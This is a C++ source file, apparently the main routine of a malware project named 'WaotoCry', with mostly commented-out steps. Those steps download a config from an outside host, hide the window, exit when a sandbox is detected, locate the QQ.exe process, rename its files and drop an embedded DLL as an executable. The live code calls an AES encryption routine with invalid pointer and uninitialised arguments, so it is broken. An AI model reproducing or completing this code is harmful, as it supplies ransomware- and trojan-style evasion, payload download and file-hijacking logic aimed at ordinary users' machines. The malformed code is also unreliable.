#include "Un-main.h"


WaotoCry _WaotoCry;



int main() {
	char* QQ_path;
	char* QQ_path_1;
	string string_qq_path;
	WCHAR CPU_INFORMATION;  
	BYTE password,data;
	DWORD dwpasswordLength, dwDatalength, dwBufferLenth;
	DWORD ADDRESS;


	//no_windows();
	//download("http://oh6kf0af4o.great-site.net/download/config_download/Config.WaotoCry","\\Config.WaotoCry");
	
	//CPU_INFORMATION=search_regedit_CPU_information();
	//cout << "CPUÐÍºÅ-->" << CPU_INFORMATION << endl;

	//// int Aes_Encryption_Funtion(BYTE * ppassword, DWORD dwpasswordLength, BYTE * pData, DWORD & dwDatalength, DWORD dwBufferLength) {
	password = (char)"holle,world";
	Aes_Encryption_Funtion((BYTE*)123456, 6, (BYTE*)"holleworld",ADDRESS, 1024);

	//_WaotoCry.process_break_sendbox = 0;
	//_WaotoCry.process_break_sendbox = determine();
	//if (!_WaotoCry.process_break_sendbox) {
	//exit(1);
	//}
	// 
	// 
	//_WaotoCry.process_new_path = new_process_path();
	//add_double_data(_WaotoCry.process_new_path);
	//increase(_WaotoCry.process_new_path);
	//_WaotoCry.get_process_dir= Get_Process_in_dir();  //new process in the dir
	//_WaotoCry.get_pid=GetProcesspId((const char*)"QQ.exe"); //obtaion QQ PROCESS THE PID
	//_WaotoCry.process_pid_path=process_pid_to_path(_WaotoCry.get_pid); //obtain		h for PID
	//string_qq_path = _WaotoCry.process_pid_path; 
	//QQ_path = (char*)string_qq_path.c_str();
	//_WaotoCry.target_process_path = replace_string(string_qq_path, "\\QQ.exe", "");//Modifly string information
	//QQ_path= (char*)_WaotoCry.target_process_path.c_str(); 
	//QQ_path_1= (char*)_WaotoCry.target_process_path.c_str();
	//reaname(QQ_path, QQ_path_1);//Modifly File name
	//_WaotoCry.off = CreateEXE(QQ_path, IDR_DLL1, (char*)"DLL");

	system("pause");
	return 0;
}